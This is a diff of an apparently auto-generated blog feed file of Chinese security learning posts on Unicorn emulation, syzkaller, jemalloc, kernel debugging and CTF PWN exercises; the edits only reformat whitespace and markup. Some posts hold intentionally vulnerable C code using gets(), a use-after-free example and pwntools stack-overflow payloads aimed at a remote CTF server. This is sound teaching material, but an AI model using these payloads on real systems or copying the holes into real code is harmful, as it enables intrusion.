@@ -706,9 +706,9 @@ index a340766b51fe.<span style="color:#ae81ff">.2</span>ef8bd29e188 <span style=
             <description>0x00 介绍 Unicorn是一个轻量级, 多平台, 多架构的CPU模拟器框架，基于qemu开发，它可以代替CPU模拟代码的执行，常用于恶意代码分析，Fuzz等。
 0x01 安装   官网有编译好不同平台的二进制包，直接安装就行。但是看了一下时间2017年的，qemu已经升级好几个版本了。api也比较老旧。
   去github看了一下是否有在更新，发现一直有在更新，不过好像也没更新啥，只是修复一些bug，下载git源码，自己编译。目前最新1.0.2rc
-git clone https://github.com/unicorn-engine/unicorn.gitcd unicorn# UNICORN_ARCHS=&amp;#34;arm aarch64 x86&amp;#34; ./make.sh # 设置要编译的架构 可选 默认6种全编译 (Arm, Arm64, M68K, Mips, Sparc, &amp;amp; X86)./make.shsudo ./make.sh install# python 绑定cd bindings/pythonsudo python3 setup.py install还有更多交叉编译选项参考 文档
+git clone https://github.com/unicorn-engine/unicorn.git cd unicorn # UNICORN_ARCHS=&amp;#34;arm aarch64 x86&amp;#34; ./make.sh # 设置要编译的架构 可选 默认6种全编译 (Arm, Arm64, M68K, Mips, Sparc, &amp;amp; X86) ./make.sh sudo ./make.sh install # python 绑定 cd bindings/python sudo python3 setup.py install 还有更多交叉编译选项参考 文档
   0x02 简单使用 C :
-#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;unicorn/unicorn.h&amp;gt;// 要模拟的指令#define X86_CODE32 &amp;#34;\x41\x4a&amp;#34; // INC ecx; DEC edx// 起始地址#define ADDRESS 0x1000000int main(int argc, char const *argv[]){// 设置engine uc_engine *uc;uc_err err;//设置寄存器 int r_ecx = 0x1234;int r_edx = 0x5678;printf(&amp;#34;Emulate i386 code\n&amp;#34;);// x86 32bit 初始化 err = uc_open(UC_ARCH_X86, UC_MODE_32, &amp;amp;uc);if (err !</description>
+#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;unicorn/unicorn.h&amp;gt; // 要模拟的指令 #define X86_CODE32 &amp;#34;\x41\x4a&amp;#34; // INC ecx; DEC edx  // 起始地址 #define ADDRESS 0x1000000  int main(int argc, char const *argv[]){ // 设置engine  uc_engine *uc; uc_err err; //设置寄存器  int r_ecx = 0x1234; int r_edx = 0x5678; printf(&amp;#34;Emulate i386 code\n&amp;#34;); // x86 32bit 初始化  err = uc_open(UC_ARCH_X86, UC_MODE_32, &amp;amp;uc); if (err !</description>
             <content type="html"><![CDATA[<h3 id="0x00-介绍">0x00 介绍</h3>
 <p>Unicorn是一个轻量级, 多平台, 多架构的CPU模拟器框架，基于qemu开发，它可以代替CPU模拟代码的执行，常用于恶意代码分析，Fuzz等。</p>
 <h3 id="0x01-安装">0x01 安装</h3>
@@ -732,8 +732,8 @@ sudo python3 setup.py install
 </ol>
 <h3 id="0x02-简单使用">0x02 简单使用</h3>
 <p>C :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unicorn/unicorn.h&gt;</span><span style="color:#75715e">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unicorn/unicorn.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e"></span>
 <span style="color:#75715e">// 要模拟的指令
 </span><span style="color:#75715e"></span><span style="color:#75715e">#define X86_CODE32 &#34;\x41\x4a&#34; </span><span style="color:#75715e">// INC ecx; DEC edx
@@ -796,24 +796,24 @@ sudo python3 setup.py install
 <span style="color:#f92672">from</span> unicorn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 <span style="color:#f92672">from</span> unicorn.x86_const <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
-X86_CODE32 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41\x4a</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">#INC ecx; DEC edx</span>
+X86_CODE32 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41\x4a</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">#INC ecx; DEC edx</span>
 
 ADDRESS <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1000000</span>
 
 <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Emulate i386 code&#34;</span>)
 
 <span style="color:#66d9ef">try</span>:
-    <span style="color:#75715e">## 初始化模拟器为x86 32bit</span>
+    <span style="color:#75715e">## 初始化模拟器为x86 32bit</span>
     mu <span style="color:#f92672">=</span> Uc(UC_ARCH_X86,UC_MODE_32)
-    <span style="color:#75715e"># mu = Uc(UC_ARCH_ARM64,UC_MODE_64)</span>
-    <span style="color:#75715e">## 2MB 的memory</span>
+    <span style="color:#75715e"># mu = Uc(UC_ARCH_ARM64,UC_MODE_64)</span>
+    <span style="color:#75715e">## 2MB 的memory</span>
     mu<span style="color:#f92672">.</span>mem_map(ADDRESS,<span style="color:#ae81ff">2</span><span style="color:#f92672">*</span><span style="color:#ae81ff">1024</span><span style="color:#f92672">*</span><span style="color:#ae81ff">1024</span>)
-    <span style="color:#75715e">## </span>
+    <span style="color:#75715e">## </span>
     mu<span style="color:#f92672">.</span>mem_write(ADDRESS,X86_CODE32)
-    <span style="color:#75715e">##</span>
+    <span style="color:#75715e">##</span>
     mu<span style="color:#f92672">.</span>reg_write(UC_X86_REG_ECX,<span style="color:#ae81ff">0x1234</span>)
     mu<span style="color:#f92672">.</span>reg_write(UC_X86_REG_EDX,<span style="color:#ae81ff">0x7890</span>)
-    <span style="color:#75715e">##</span>
+    <span style="color:#75715e">##</span>
     mu<span style="color:#f92672">.</span>emu_start(ADDRESS, ADDRESS <span style="color:#f92672">+</span> len(X86_CODE32))
 
     <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Emulation done. Below is the CPU context&#34;</span>)
@@ -894,7 +894,7 @@ sys<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>a
     <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">test</span>(self):
         <span style="color:#66d9ef">pass</span>
 
-<span style="color:#75715e"># Configure logging</span>
+<span style="color:#75715e"># Configure logging</span>
 logging<span style="color:#f92672">.</span>basicConfig(
     stream<span style="color:#f92672">=</span>sys<span style="color:#f92672">.</span>stdout,
     level<span style="color:#f92672">=</span>logging<span style="color:#f92672">.</span>DEBUG,
@@ -902,18 +902,18 @@ logging<span style="color:#f92672">.</span>basicConfig(
 )
 logger <span style="color:#f92672">=</span> logging<span style="color:#f92672">.</span>getLogger(__name__)
 
-<span style="color:#75715e">## 先创建java class</span>
+<span style="color:#75715e">## 先创建java class</span>
 
-<span style="color:#75715e">## 初始化emulater</span>
+<span style="color:#75715e">## 初始化emulater</span>
 emulator <span style="color:#f92672">=</span> Emulator(
   vfs_root<span style="color:#f92672">=</span>posixpath<span style="color:#f92672">.</span>join(posixpath<span style="color:#f92672">.</span>dirname(__file__),<span style="color:#e6db74">&#34;vfs&#34;</span>),
   vfp_inst_set<span style="color:#f92672">=</span>True
 )
 
-<span style="color:#75715e">## 注册 java class</span>
+<span style="color:#75715e">## 注册 java class</span>
 emulator<span style="color:#f92672">.</span>java_classloader<span style="color:#f92672">.</span>add_class(MainActivity)
 
-<span style="color:#75715e">## load libraries</span>
+<span style="color:#75715e">## load libraries</span>
 emulator<span style="color:#f92672">.</span>load_library(<span style="color:#e6db74">&#34;example_binaries/libdl.so&#34;</span>)
 emulator<span style="color:#f92672">.</span>load_library(<span style="color:#e6db74">&#34;example_binaries/libc.so&#34;</span>)
 emulator<span style="color:#f92672">.</span>load_library(<span style="color:#e6db74">&#34;example_binaries/libstdc++.so&#34;</span>)
@@ -921,7 +921,7 @@ emulator<span style="color:#f92672">.</span>load_library(<span style="color:#e6d
 
 tar_lib <span style="color:#f92672">=</span> emulator<span style="color:#f92672">.</span>load_library(<span style="color:#e6db74">&#34;example_binaries/libtest.so&#34;</span>)
 
-<span style="color:#75715e"># Show loaded modules.</span>
+<span style="color:#75715e"># Show loaded modules.</span>
 logger<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Loaded modules:&#34;</span>)
 
 <span style="color:#66d9ef">for</span> module <span style="color:#f92672">in</span> emulator<span style="color:#f92672">.</span>modules:
@@ -929,16 +929,16 @@ logger<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;
 
 
 <span style="color:#66d9ef">try</span>:
-    <span style="color:#75715e">## Run JNI_OnLoad.</span>
+    <span style="color:#75715e">## Run JNI_OnLoad.</span>
     emulator<span style="color:#f92672">.</span>call_symbol(tar_lib, <span style="color:#e6db74">&#39;JNI_OnLoad&#39;</span>, emulator<span style="color:#f92672">.</span>java_vm<span style="color:#f92672">.</span>address_ptr, <span style="color:#ae81ff">0x00</span>)
     emulator<span style="color:#f92672">.</span>mu<span style="color:#f92672">.</span>hook_add(UC_HOOK_MEM_UNMAPPED, debug_utils<span style="color:#f92672">.</span>hook_unmapped)
 
-    <span style="color:#75715e"># Do native stuff.</span>
+    <span style="color:#75715e"># Do native stuff.</span>
     emulator<span style="color:#f92672">.</span>mu<span style="color:#f92672">.</span>hook_add(UC_HOOK_CODE, debug_utils<span style="color:#f92672">.</span>hook_code)
     main_activity <span style="color:#f92672">=</span> MainActivity()
     logger<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Response from JNI call: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> main_activity<span style="color:#f92672">.</span>string_from_jni(emulator))
 
-    <span style="color:#75715e"># Dump natives found.</span>
+    <span style="color:#75715e"># Dump natives found.</span>
     logger<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Exited EMU.&#34;</span>)
     logger<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Native methods registered to MainActivity:&#34;</span>)
 
@@ -977,7 +977,7 @@ logger<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;
  GCC 6.1.0+    linux kernel
  编译 v4.6以后编译时确保CONFIG_KCOV=y 之前版本：这样添加支持 一些额外选项    VM 一般QEMU
  支持QEMU、kvmtool和GCE虚拟机、Android设备和Odroid C2开发板 需要进行通信：vm要提供网络支持 vm配置需要ssh服务器 要能执行ssh -i $SSHID -p $PORT root@localhost 需要将debugfs 挂在到 /sys/kernel/debug    Golang 安装
-wget https://dl.google.com/go/go1.14.1.linux-amd64.tar.gztar -C ~/goroot -xzf go1.14.1.linux-amd64.tar.gzvim /etc/profilemkdir /usr/local/gopath# 添加export export GOROOT=/home/kuekiko/gorootexport GOPATH=/home/kuekiko/gopathexport PATH=$GOROOT/bin:$PATHexport PATH=$GOPATH/bin:$PATHsource etc/profile  syzkaller</description>
+wget https://dl.google.com/go/go1.14.1.linux-amd64.tar.gz tar -C ~/goroot -xzf go1.14.1.linux-amd64.tar.gz vim /etc/profile mkdir /usr/local/gopath # 添加export export GOROOT=/home/kuekiko/goroot export GOPATH=/home/kuekiko/gopath export PATH=$GOROOT/bin:$PATH export PATH=$GOPATH/bin:$PATH source etc/profile   syzkaller</description>
             <content type="html"><![CDATA[<ul>
 <li>
 <h3 id="0x00-介绍">0x00 介绍</h3>
@@ -1066,17 +1066,17 @@ CONFIG_SECURITYFS<span style="color:#f92672">=</span>y
 make CC<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$GCC<span style="color:#e6db74">/bin/gcc&#34;</span> olddefconfig
 make CC<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$GCC<span style="color:#e6db74">/bin/gcc&#34;</span> -j4
 </code></pre></div><h5 id="qemu">qemu</h5>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">qemu-system-x86_64 <span style="color:#ae81ff">\</span>
-  -kernel $KERNEL/arch/x86/boot/bzImage <span style="color:#ae81ff">\</span>
-  -append <span style="color:#e6db74">&#34;console=ttyS0 root=/dev/sda earlyprintk=serial&#34;</span><span style="color:#ae81ff">\</span>
-  -hda $IMAGE/stretch.img <span style="color:#ae81ff">\</span>
-  -net user,hostfwd<span style="color:#f92672">=</span>tcp::10021-:22 -net nic <span style="color:#ae81ff">\</span>
-  -enable-kvm <span style="color:#ae81ff">\</span>
-  -nographic <span style="color:#ae81ff">\</span>
-  -m 2G <span style="color:#ae81ff">\</span>
-  -smp <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">\</span>
-  -pidfile vm.pid <span style="color:#ae81ff">\</span>
-  2&gt;&amp;<span style="color:#ae81ff">1</span> | tee vm.log
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">qemu-system-x86_64 <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>  -kernel $KERNEL/arch/x86/boot/bzImage <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>  -append <span style="color:#e6db74">&#34;console=ttyS0 root=/dev/sda earlyprintk=serial&#34;</span><span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>  -hda $IMAGE/stretch.img <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>  -net user,hostfwd<span style="color:#f92672">=</span>tcp::10021-:22 -net nic <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>  -enable-kvm <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>  -nographic <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>  -m 2G <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>  -smp <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>  -pidfile vm.pid <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>  2&gt;&amp;<span style="color:#ae81ff">1</span> | tee vm.log
 </code></pre></div><p>ssh连接</p>
 <p><code>ssh -i $IMG/stretch.id_rsa -p 10021 -o &quot;StrictHostKeyChecking no&quot; root@localhost</code></p>
 <p><img src="https://my-md-1253484710.file.myqcloud.com/20200417165654.png" alt=""></p>
@@ -1136,7 +1136,7 @@ jemalloc的一些特性与设计原则：
  强大的多核/多线程分配能力. 最小化的元数据开销 基于每个线程进行缓存，避免了同步问题。 避免了连续分配内存的碎片化问题。 简洁高效  0x01 结构  jemalloc对内存划分按照如下由高到低的顺序:
    内存是由一定数量的arenas进行管理. 一个arena被分割成若干chunks, 后者主要负责记录bookkeeping（记录信息）. chunk内部又包含着若干runs, 作为分配小块内存的基本单元. run由pages组成, 最终被划分成一定数量的regions 对于small size的分配请求来说, 这些region就相当于user memory.   arenas 对于Android来说：
 限制了只使用两个arenas,每个带有一个lock。这意味着，不同线程尝试分配内存时，会循环、平均分配至两个arena，确保两个arena有大致相等的进程数量。只有在相同的arena中分配内存时才需要获取lock。
-#/android.bpandroid_product_variables = {// Only enable the tcache on non-svelte configurations, to save PSS. malloc_not_svelte: {cflags: [&amp;#34;-UANDROID_MAX_ARENAS&amp;#34;,&amp;#34;-DANDROID_MAX_ARENAS=2&amp;#34;,&amp;#34;-DJEMALLOC_TCACHE&amp;#34;,&amp;#34;-DANDROID_TCACHE_NSLOTS_SMALL_MAX=8&amp;#34;,&amp;#34;-DANDROID_TCACHE_NSLOTS_LARGE=16&amp;#34;,],},}用shadow查看arenas</description>
+#/android.bp android_product_variables = { // Only enable the tcache on non-svelte configurations, to save PSS.  malloc_not_svelte: { cflags: [ &amp;#34;-UANDROID_MAX_ARENAS&amp;#34;, &amp;#34;-DANDROID_MAX_ARENAS=2&amp;#34;, &amp;#34;-DJEMALLOC_TCACHE&amp;#34;, &amp;#34;-DANDROID_TCACHE_NSLOTS_SMALL_MAX=8&amp;#34;, &amp;#34;-DANDROID_TCACHE_NSLOTS_LARGE=16&amp;#34;, ], }, } 用shadow查看arenas</description>
             <content type="html"><![CDATA[<h3 id="0x00-简单介绍">0x00 简单介绍</h3>
 <p>想调一个CVE、发现对jemalloc 了解太少。重新复习复习jemalloc，做个记录。</p>
 <p>jemalloc最初是2005年 Jason Evans开发的新一代内存分配器， 之后没多久被添加到FreeBSD的libc中的默认内存分配器，用来替代原来的phkmalloc。2007年 Firefox Mozilla项目的独立版本也将jemalloc作为主要的分配器。2009年，Facebook 的后端项目也广泛使用jemalloc。2014年，Android 5 开始采用jemalloc作为主要的内存分配器，不过部分Android5/6依然能看到dlmalloc和jemalloc两者并存。</p>
@@ -1331,7 +1331,7 @@ jemalloc的一些特性与设计原则：
 这里下载的是linux-4.10.10
 解压tar -xvJf linux-4.10.10.tar.xz
 安装依赖
-sudo apt install build-essential ncurses-dev xz-utils libssl-dev bc fakeroot aptitude libncurses5-dev​ sudo apt install qemu编译内核 make menuconfig进行配置：KernelHacking —&amp;gt; Compile-time checks and compiler options选中
+sudo apt install build-essential ncurses-dev xz-utils libssl-dev bc fakeroot aptitude libncurses5-dev ​ sudo apt install qemu 编译内核 make menuconfig 进行配置：KernelHacking —&amp;gt; Compile-time checks and compiler options选中
 Compile the kernel with debug infoCompile the kernel with frame pointersProvide GDB scripts for kernel debuggingProcessor type and features→去掉Paravirtualized guest support保存退出。
 命令make -jN 进行编译
 之后make all
@@ -1391,18 +1391,18 @@ make install
 </code></pre></div><p>创建文件系统</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">find . | cpio -o --format<span style="color:#f92672">=</span>newc &gt; ../rootfs.img
 </code></pre></div><h4 id="运行内核">运行内核</h4>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">    qemu-system-x86_64 <span style="color:#ae81ff">\</span>
-
-​    -kernel ~/linux-4.10.10/arch/x86_64/boot/bzImage <span style="color:#ae81ff">\</span>
-
-​    -initrd ~/busybox-1.31.0/rootfs.img <span style="color:#ae81ff">\</span>
-
-​    -append <span style="color:#e6db74">&#34;console=ttyS0 root=/dev/ram rdinit=/sbin/init&#34;</span> <span style="color:#ae81ff">\</span>
-
-​    -cpu kvm64,+smep,+smap <span style="color:#ae81ff">\</span>
-
-​    -nographic <span style="color:#ae81ff">\</span>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">    qemu-system-x86_64 <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>
+​    -kernel ~/linux-4.10.10/arch/x86_64/boot/bzImage <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>
+​    -initrd ~/busybox-1.31.0/rootfs.img <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>
+​    -append <span style="color:#e6db74">&#34;console=ttyS0 root=/dev/ram rdinit=/sbin/init&#34;</span> <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>
+​    -cpu kvm64,+smep,+smap <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>
+​    -nographic <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>
 ​    -gdb tcp::1234
 </code></pre></div><p>**<code>-**cpu kvm64,**+**smep,**+**smap</code> 设置CPU的安全选项，这里开启了smap和smep</p>
 <p>**<code>-**kernel</code> 设置内核bzImage文件的路径</p>
@@ -1440,9 +1440,9 @@ make install
 把PI的官方系统换成了Ubuntu 18.04。
 安装了GCC 、gdb、gef（经测试只有gef能用），其他也没什么需要装的。
 关闭地址随机化
-sudo cat /proc/sys/kernel/randomize_va_space # 状态查看2 # 开启中sudo echo 0 &amp;gt; /proc/sys/kernel/randomize_va_space bash: /proc/sys/kernel/randomize_va_space: Permission deniedsuecho 0 &amp;gt; /proc/sys/kernel/randomize_va_spacecat /proc/sys/kernel/randomize_va_space0 #这就OK  QEMU 模拟 (WSL2)
+sudo cat /proc/sys/kernel/randomize_va_space # 状态查看 2 # 开启中 sudo echo 0 &amp;gt; /proc/sys/kernel/randomize_va_space bash: /proc/sys/kernel/randomize_va_space: Permission denied su echo 0 &amp;gt; /proc/sys/kernel/randomize_va_space cat /proc/sys/kernel/randomize_va_space 0 #这就OK   QEMU 模拟 (WSL2)
 安装
-#防止又出什么乱七八糟的错误和需求，尽量都装上apt install gdb gdb-multiarch ##apt install qemu ##apt install gcc-arm-linux-gnueabi gcc-aarch64-linux-gnu ##gcc arm 依赖库安装  0x02 启动和调试   树莓派</description>
+#防止又出什么乱七八糟的错误和需求，尽量都装上 apt install gdb gdb-multiarch ## apt install qemu ## apt install gcc-arm-linux-gnueabi gcc-aarch64-linux-gnu ##gcc arm 依赖库安装   0x02 启动和调试   树莓派</description>
             <content type="html"><![CDATA[<h3 id="0x00-前言">0x00 前言</h3>
 <p>学PWN也有一段时间了，x86/x86_64 下算是入了个门，平时接触ARM比较多，正好以ARM架构下再更加深入的学习PWN。</p>
 <p>会用的工具、环境：</p>
@@ -1789,8 +1789,8 @@ Password：mobsec
 </blockquote>
 <h3 id="利用">利用</h3>
 <h5 id="简单利用">简单利用</h5>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e"></span><span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">void</span> (<span style="color:#f92672">*</span>func_ptr)(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>);
 <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">evil_fuc</span>(<span style="color:#66d9ef">char</span> command[])
 {
@@ -1819,11 +1819,11 @@ printf(<span style="color:#e6db74">&#34;%s&#34;</span>,content);
 <h5 id="pwnablekr-uaf">pwnable.kr uaf</h5>
 <p><img src="http://my-md-1253484710.coscd.myqcloud.com/20180912220453.png" alt=""></p>
 <p>先看看源码：</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;iostream&gt; </span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;cstring&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;cstdlib&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;iostream&gt; </span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;cstring&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;cstdlib&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e"></span><span style="color:#66d9ef">using</span> <span style="color:#66d9ef">namespace</span> std;
 
 <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Human</span>{
@@ -1994,7 +1994,7 @@ printf(<span style="color:#e6db74">&#34;%s&#34;</span>,content);
  知识点：PWN相关知识点总结
  Linux PWN ARM PWN  题目全部来源于 CTFWiki 上所涉及题目
 Linux PWN 大部分原理参考CTFWiki
-栈溢出 基本栈溢出 #include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;void success() { puts(&amp;#34;You Hava already controlled it.&amp;#34;); }void vulnerable() {char s[12];gets(s);puts(s);return;}int main(int argc, char **argv) {vulnerable();return 0;}# gcc -m32 -fno-stack-protector -no-pie stack1.c -o stack1stack1.c: In function ‘vulnerable’:stack1.c:6:3: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’?</description>
+栈溢出 基本栈溢出 #include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;void success() { puts(&amp;#34;You Hava already controlled it.&amp;#34;); } void vulnerable() { char s[12]; gets(s); puts(s); return; } int main(int argc, char **argv) { vulnerable(); return 0; } # gcc -m32 -fno-stack-protector -no-pie stack1.c -o stack1 stack1.c: In function ‘vulnerable’: stack1.c:6:3: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’?</description>
             <content type="html"><![CDATA[<hr>
 <blockquote>
 <p>看CTFWiki来入门CTF-PWN  (Linux和arm) 做个记录</p>
@@ -2009,8 +2009,8 @@ Linux PWN 大部分原理参考CTFWiki
 <p>大部分原理参考<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/readme/">CTFWiki</a></p>
 <h4 id="栈溢出">栈溢出</h4>
 <h5 id="基本栈溢出">基本栈溢出</h5>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">success</span>() { puts(<span style="color:#e6db74">&#34;You Hava already controlled it.&#34;</span>); }
 <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vulnerable</span>() {
   <span style="color:#66d9ef">char</span> s[<span style="color:#ae81ff">12</span>];
@@ -2036,11 +2036,11 @@ stack1.c:(.text<span style="color:#f92672">+</span><span style="color:#ae81ff">0
 <p><img src="https://my-md-1253484710.file.myqcloud.com/20190406211946.png" alt=""></p>
 <p><img src="https://my-md-1253484710.file.myqcloud.com/20190406212108.png" alt=""></p>
 <p>poc1.py</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#coding=utf-8</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#coding=utf-8</span>
 
 <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
-<span style="color:#75715e"># sh = process(&#34;./stack1&#34;)</span>
+<span style="color:#75715e"># sh = process(&#34;./stack1&#34;)</span>
 sh <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;47.106.212.155&#34;</span>,<span style="color:#ae81ff">10000</span>)
 success_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08048456</span>
 
@@ -2098,7 +2098,7 @@ AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaA
 <p>payload</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
   
-<span style="color:#75715e"># sh = process(./ret2text)</span>
+<span style="color:#75715e"># sh = process(./ret2text)</span>
 sh <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;47.106.212.155&#34;</span>,<span style="color:#ae81ff">10001</span>)
 binsh <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0804863a</span>
 payload <span style="color:#f92672">=</span> <span style="color:#ae81ff">112</span><span style="color:#f92672">*</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">+</span> p32(binsh)
@@ -2119,15 +2119,15 @@ sh<span style="color:#f92672">.</span>interactive()
 <p><img src="https://my-md-1253484710.file.myqcloud.com/20190407132843.png" alt=""></p>
 <p><img src="https://my-md-1253484710.file.myqcloud.com/20190407133456.png" alt=""></p>
 <p>payload:</p>
